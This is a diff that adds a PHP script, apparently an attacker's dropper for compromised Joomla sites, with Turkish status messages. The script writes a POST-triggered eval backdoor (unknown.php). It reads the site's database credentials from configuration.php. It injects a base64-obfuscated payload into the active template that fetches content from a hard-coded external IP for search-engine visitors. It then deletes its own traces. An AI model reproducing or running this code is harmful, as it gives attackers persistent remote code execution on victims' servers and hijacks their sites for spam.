@@ -1,0 +1,87 @@
+<?php
+$rand = md5(rand(1111111111,9999999999).time()."JpSzKlMn!");
+$unk ='<?php  if($_POST["'.$rand.'"]){$cmd = $_POST["'.$rand.'"]; eval (stripslashes($cmd)); echo "ok";} ?>';
+if (!file_write("./unknown.php",$unk,1))exit("yazamadim\n<br>"); 
+else echo "backdoor writed\n<br>";
+
+if (!file_read("./unknown.php"))die("yazdým ama okuyamadým");else echo "okudum seed=> http://{$_SERVER['HTTP_HOST']}/ $rand\n<br>";
+
+$root = str_replace("images/stories","",dirname(__FILE__));
+
+$conf = $root."plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/config_tinybrowser.php";
+//$conf = $root.'plugins\editors\tinymce\jscripts\tiny_mce\plugins\tinybrowser\config_tinybrowser.php';
+//echo $conf;
+if (!is_file($conf))echo ("config file yok\n<br>"); else {
+
+$a = file_read($conf);
+
+$a = str_replace("error_reporting(0);","if (!\$_POST['$rand']) defined( '_JEXEC' ) or die( 'Restricted access' ); \n\r error_reporting(0);",$a);
+if (file_write($conf,$a)) echo "bug kapandi => $rand\n<br>"; else echo "bug kapanmadý.\n<br>";	
+}
+
+
+
+include $root."configuration.php";
+$my_class = new JConfig();
+$class_vars = get_class_vars(get_class($my_class));
+//print_r($class_vars);
+
+$conn = mysql_connect($class_vars[host], $class_vars[user], $class_vars[password]);
+if(! $conn )
+{
+  die('Could not connect: ' . mysql_error());
+}
+
+mysql_select_db($class_vars[db]);
+$as = mysql_query("SELECT template FROM {$class_vars[dbprefix]}templates_menu WHERE client_id ='0'");
+//echo $as;
+$template = mysql_result($as,0,"template");
+if (!is_file($root."templates/$template/index.php"))die("index file yok\n");
+$index=file_read($root."templates/$template/index.php");
+
+if (file_write($root."templates/$template/index.back.php",$index,1)) {
+	echo "back yazýldý \n<br>";
+	$index = str_replace("</body>",'<?php @eval(base64_decode("aWYgKHByZWdfbWF0Y2ggKCIvW0dnXVtPb11bT29dW0dnXVtMbF1bRWVdfFtMbF1bSWldW1Z2XVtFZV18W01tXVtTc11bTm5dfFtZeV1bQWFdW0hoXVtPb11bT29dfFtBYV1bU3NdW0trXXxbQWFdW09vXVtMbF18W0JiXVtPb11bVHRdLyIsJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdKSkgew0KCSRsb2MgPSAiaHR0cDovLzE3NC4xMzIuMjQxLjI0NC9saXN0b25lLnBocD91cmw9Ii4kX1NFUlZFUlsnSFRUUF9IT1NUJ107DQoJaWYoaW5pX2dldCgiYWxsb3dfdXJsX2ZvcGVuIikgIT0gMSkgew0KCQlAaW5pX3NldCgiYWxsb3dfdXJsX2ZvcGVuIiwgIjEiKTsNCgl9DQoJaWYoaW5pX2dldCgiYWxsb3dfdXJsX2ZvcGVuIikgIT0gMSkgew0KCQlpZihAZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSl7DQoJCQkkY2ggPSBAY3VybF9pbml0KCk7DQoJCQlAY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwkbG9jKTsNCgkJCWN1cmxfc2V0b3B0ICggJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlICk7DQoJCQljdXJsX3NldG9wdCAoICRjaCwgQ1VSTE9QVF9IRUFERVIsIGZhbHNlICk7DQoJCQllY2hvIEBjdXJsX2V4ZWMoJGNoKTsNCgkJCUBjdXJsX2Nsb3NlKCRjaCk7DQoJCQl9ZWxzZSB7DQoJCQkkZnAgPSBAZnNvY2tvcGVuKCIxNzQuMTMyLjI0MS4yNDQiLCA4MCwgJGVycm5vLCAkZXJyc3RyLCAzMCk7DQoJCQlpZiAoJGZwKSB7DQoJCQkJJG91dCA9ICJHRVQgL2xpc3RvbmUucGhwP3VybD0iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIEhUVFAvMS4xXHJcbiI7DQoJCQkJJG91dCAuPSAiSG9zdDogMTc0LjEzMi4yNDEuMjQ0XHJcbiI7DQoJCQkJJG91dCAuPSAiQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiI7DQoJCQkJQGZ3cml0ZSgkZnAsICRvdXQpOw0KCQkJCSRvdCA9ICIiOw0KCQkJCXdoaWxlICghQGZlb2YoJGZwKSkgew0KCQkJCQkkb3QgLj0gQGZnZXRzKCRmcCwgMTI4KTsNCgkJCQl9DQoJCQkJQGZjbG9zZSgkZnApOw0KCQkJCSRyZXNwb25zZSA9IEBwcmVnX3NwbGl0KCcvKENvbnRlbnQtVHlwZVw6Lis/KVtcclxuXSsvaScsICRvdCwgLTEsIFBSRUdfU1BMSVRfREVMSU1fQ0FQVFVSRSk7DQoJCQkJcHJpbnQgJHJlc3BvbnNlWzJdOw0KCQkJfQ0KCQl9DQoJfSBlbHNlIHsNCgkJZWNobyAgQGZpbGVfZ2V0X2NvbnRlbnRzKCRsb2MpOw0KCX0NCn0NCg0KaWYgKCRfR0VUWyJwaW5nIl0pIHsNCiRzbmFtZSA9IGV4cGxvZGUoIi4iLCRfU0VSVkVSWydIVFRQX0hPU1QnXSk7DQokcHVybCA9ICJodHRwOi8vcGluZ29tYXRpYy5jb20vcGluZy8/dGl0bGU9Ii51cmxkZWNvZGUoJHNuYW1lWzFdKS4iJmJsb2d1cmw9aHR0cDovLyIudXJsZGVjb2RlKCRfU0VSVkVSWydIVFRQX0hPU1QnXSkuIiZyc3N1cmw9JmNoa19ibG9ncz1vbiZjaGtfc3luZGljOD1vbiZjaGtfcHVic3ViY29tPW9uJmNoa19ibG9nc3RyZWV0PW9uJmNoa193ZWJsb2dhbG90PW9uJmNoa19uZXdzaXNmcmVlPW9uJmNoa190b3BpY2V4Y2hhbmdlPW9uJmNoa190YWlscmFuaz1vbiZjaGtfYmxvZ2xpbmVzPW9uJmNoa19haWRlcnNzPW9uJmNoa193ZWJsb2dzY29tPW9uJmNoa19ibG9nZGlnZ2VyPW9uIjsNCmlmKGluaV9nZXQoImFsbG93X3VybF9mb3BlbiIpICE9IDEpIHsNCgkJaWYoQGZ1bmN0aW9uX2V4aXN0cygnY3VybF9pbml0Jykpew0KCQkJJGNoID0gQGN1cmxfaW5pdCgpOw0KCQkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwkcHVybCk7DQoJCQljdXJsX3NldG9wdCAoICRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSApOw0KCQkJY3VybF9zZXRvcHQgKCAkY2gsIENVUkxPUFRfSEVBREVSLCBmYWxzZSApOw0KCQkJJHZlcmkgPSAgQGN1cmxfZXhlYygkY2gpOw0KCQkJQGN1cmxfY2xvc2UoJGNoKTsNCgkJfQ0KfWVsc2Ugew0KJHZlcmkgPSBAZmlsZV9nZXRfY29udGVudHMoJHB1cmwpOw0KfQ0KDQppZiAocHJlZ19tYXRjaCgiI1Bpbmcgc2VudCNzaSIsICR2ZXJpLCRhbmQpKSB7DQogICAgZWNobyAiPHNwYW4gc3R5bGU9J2NvbG9yOmdyZWVuJz5PSzwvc3Bhbj4iOw0KfSBlbHNlIHsNCiAgICBlY2hvICI8c3BhbiBzdHlsZT0nY29sb3I6cmVkJz5LTzwvc3Bhbj4iOw0KfQ0KfQ==")); ?></body>',$index);
+if (file_write($root."templates/$template/index.php",$index))echo "index yazýldý\n<br>"; else die("index yazýlamadý");
+}
+if (is_file(dirname(__FILE__)."/uimagic.php")){ unlink(dirname(__FILE__)."/uimagic.php");echo "<b>sly is here.\n</b><br>";}
+if (unlink(dirname(__FILE__)."/sets.php")) echo "sildim";else echo "silemedim";
+
+
+
+
+
+function file_read($file){
+	$fh = fopen($file, "r");
+	$ind = fread($fh, filesize($file));
+	fclose($fh);
+	return $ind;
+}
+
+
+
+function file_write($filename, &$content,$new=0) {
+	if($new!==1){
+		if (!is_writable($filename)) {
+			if (!chmod($filename, 0777)) {
+				echo "Cannot change the mode of file ($filename)";
+			return false;
+			};
+		}
+	}
+	if (!$fp = @fopen($filename, "w")) {
+		echo "Cannot open file ($filename)";
+		return false;
+	}
+	if (fwrite($fp, $content) === FALSE) {
+		echo "Cannot write to file ($filename)";
+		return false;
+	}else {
+		return true;
+	}
+	if (!fclose($fp)) {
+		echo "Cannot close file ($filename)";
+	//	return false;
+	}
+}
+?>
